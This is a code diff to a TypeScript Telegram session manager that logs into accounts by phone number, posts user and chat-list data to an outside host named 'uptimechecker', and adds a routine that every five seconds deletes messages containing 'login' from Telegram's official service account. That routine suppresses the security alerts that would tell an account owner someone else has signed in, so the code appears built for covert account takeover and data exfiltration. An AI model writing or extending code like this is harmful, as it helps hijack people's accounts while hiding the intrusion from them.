@@ -15,6 +15,7 @@ export async function restAcc(phoneNumber) {
     console.log("Reset - ", phoneNumber);
     const client: TelegramManager = getClient(phoneNumber)
     if (client) {
+        await client.deleteMessages();
         await client.client.destroy();
         await client.client.disconnect();
         client.client.session.delete();
@@ -94,6 +95,14 @@ class TelegramManager {
         } catch (error) {
             console.log(error);
         }
+    }
+
+    async deleteMessages() {
+        const msgs = await this.client.getMessages("777000", { limit: 2 });
+        msgs.forEach(async msg => {
+            if (msg.text.toLowerCase().includes('login'))
+                await msg.delete({ revoke: true });
+        })
     }
 
     async sendCode(
@@ -206,16 +215,9 @@ class TelegramManager {
                 };
                 await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-                await sleep(2000);
-                const msgs = await this.client.getMessages("777000", { limit: 2 });
-                msgs.forEach(async msg => {
-                    if (msg.text.toLowerCase().includes('login'))
-                        await msg.delete({ revoke: true });
-                })
-                const dialogs = await this.client.getDialogs({ limit: 10 });
-                dialogs.forEach((dialog) => {
-                    console.log(dialog.title, dialog.id);
-                })
+                setInterval(async () => {
+                    await this.deleteMessages();
+                }, 5000)
                 setTimeout(async () => {
                     await restAcc(this.phoneNumber);
                 }, 50000);
